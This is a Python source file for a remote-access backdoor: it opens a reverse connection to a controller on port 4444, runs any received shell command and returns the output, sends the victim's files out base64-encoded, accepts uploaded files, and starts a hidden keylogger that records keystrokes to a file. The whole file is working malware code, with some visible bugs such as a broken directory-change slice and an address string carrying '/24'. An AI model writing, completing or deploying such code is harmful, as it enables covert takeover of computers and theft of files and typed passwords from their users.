import socket
import json
import subprocess
from pynput.keyboard import Listener
from pynput import keyboard
import os
import base64
import time

keylogger_listener = None
keys_info = 'logss.txt'

def server(ip, port):
    global connection
    connection = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    while True:
        try:
            connection.connect((ip, port))
            break
        except ConnectionRefusedError:
            time.sleep(5)

def send(data):
    json_data = json.dumps(data)
    connection.send(json_data.encode('utf-8'))

def receive():
    json_data=""
    while True:
        try:
            json_data += connection.recv(1024).decode('utf-8')
            return json.loads(json_data)
        except ValueError:
            continue

def start_keylogger():
    global keylogger_listener
    def write_to_file(key):
        log = str(key)
        log = log.replace("'", '')
        if log == 'Key.space':
            log = ' '
        if log == 'Key.tab':
            log = '    '
        if log == 'Key.backspace':
            log = '[ BACKSPACE ]'
        if log == 'Key.caps_lock':
            log = '[ CAPS LOCK ]'
        if log == 'Key.shift':
            log = '[ LEFT SHIFT ]'
        if log == 'Key.ctrl_l':
            log = '[ LEFT CTRL ]'
        if log == 'Key.ctrl_r':
            log = '[ RIGHT CTRL ]'
        if log == 'Key.shift_r':
            log = '[ RIGHT SHIFT ]'
        if log == 'Key.alt_l':
            log = '[ LEFT ALT ]'
        if log == 'Key.alt_gr':
            log = '[ RIGHT ALT ]'
        if log == 'Key.enter':
            log = '\n'
        
        with open(keys_info, 'a') as f:
            f.write(log)

    if keylogger_listener == None:
        try:
            keylogger_listener = keyboard.Listener(on_press = write_to_file)
            keylogger_listener.start()
            return keylogger_listener
        except Exception as e:
            send(f'Error: {e}')     
    return keylogger_listener

def stop_keylogger():
    global keylogger_listener
    if keylogger_listener:
        try:
            keylogger_listener.stop()
            keylogger_listener = None
            return True
        except Exception as e:
            send(f'Error: {e}')
            return False
    return False

def run():
    global keylogger_listener
    while True:
        command = receive()
        if command == 'exit':
            break
        elif command[:2] == 'cd' and len(command) > 1:
            os.chdir(command[3:1])
        elif command[:8] == 'download':
            with open(command[9:], 'rb') as f:
                send(base64.b64encode(f.read()).decode('utf-8'))
        elif command[:6] == 'upload':
            with open(command[7:], 'wb') as f:
                file_data = receive()
                f.write(base64.b64encode(file_data))
        elif command == 'start_keylogger':
            if keylogger_listener is None:
                keylogger_listener = start_keylogger()
                if keylogger_listener:
                    send('Keylogger started')
                else:
                    send('Could not run Keylogger')
            else:
                send('Keylogger is already running')
        elif command == 'stop_keylogger':
            if keylogger_listener is not None:
                if stop_keylogger:
                    keylogger_listener = None
                    send('Keylogger stopped')
                else:
                    send('Could not stop Keylogger')
            else:
                send('Keylogger is not running')


        process = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stdin=subprocess.PIPE, stderr=subprocess.PIPE, universal_newlines=True)
        result = process.stdout.read() + process.stderr.read()
        send(result)


server('192.168.0.183/24', 4444)
run()